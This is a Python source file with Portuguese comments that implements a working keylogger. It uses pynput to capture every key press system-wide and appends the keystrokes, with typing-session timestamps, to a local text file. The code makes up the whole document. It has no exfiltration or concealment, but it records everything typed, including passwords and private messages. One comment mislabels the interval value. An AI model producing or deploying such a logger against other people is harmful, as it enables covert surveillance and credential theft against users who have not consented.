from pynput import keyboard
import time
import datetime

# Dicionário de mapeamento de teclas especiais para nomes legíveis
special_keys = {
    keyboard.Key.space: " [espaço] ",
    keyboard.Key.shift: " [shift] ",
    keyboard.Key.ctrl: " [ctrl] ",
    keyboard.Key.alt: " [alt] ",
    keyboard.Key.cmd: " [cmd] ",
    keyboard.Key.enter: "\n[return]\n",
    keyboard.Key.backspace: " [del] ",
    keyboard.KeyCode.from_char('`'): "`",  # Tecla `
    keyboard.KeyCode.from_char('~'): "~",  # Tecla ~
    keyboard.KeyCode.from_char("'"): "'",  # Tecla '
    keyboard.KeyCode.from_char('ç'): "ç",  # Tecla ç
    keyboard.KeyCode.from_char('é'): "é",  # Tecla é
    keyboard.KeyCode.from_char('á'): "á",  # Tecla á
    keyboard.KeyCode.from_char('ã'): "ã",  # Tecla ã
    keyboard.KeyCode.from_char('?'): "?",  # Tecla ?
    keyboard.KeyCode.from_char('/'): "/",  # Tecla /
    # Adicione outras teclas especiais aqui
}

MIN_INTERVAL_SECONDS = 3600  # 300 segundos = 5 minutos

is_typing = False
last_key_time = time.time()

def log(message):
    with open("keyfileV2.txt", 'a') as logkey:
        logkey.write(message)

def key_pressed(key):
    global is_typing, last_key_time
    
    current_time = time.time()
    time_elapsed = current_time - last_key_time
    
    if time_elapsed >= MIN_INTERVAL_SECONDS:
        if is_typing:
            log("[Término de Digitação: {}]".format(datetime.datetime.now()))
            is_typing = False
    
    char = special_keys.get(key, None)
    
    if char is None:
        try:
            char = key.char  # Tenta obter o caractere da tecla pressionada
        except AttributeError:
            char = str(key)  # Tecla especial não possui caractere associado
    
    if not is_typing:
        log("[Início de Digitação: {}]".format(datetime.datetime.now()))
        is_typing = True
    
    print(char)  # Imprime o caractere ou nome legível
    if char is not None:
        log(char)

    last_key_time = current_time

def main():
    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()
    input()

if __name__ == "__main__":
    main()
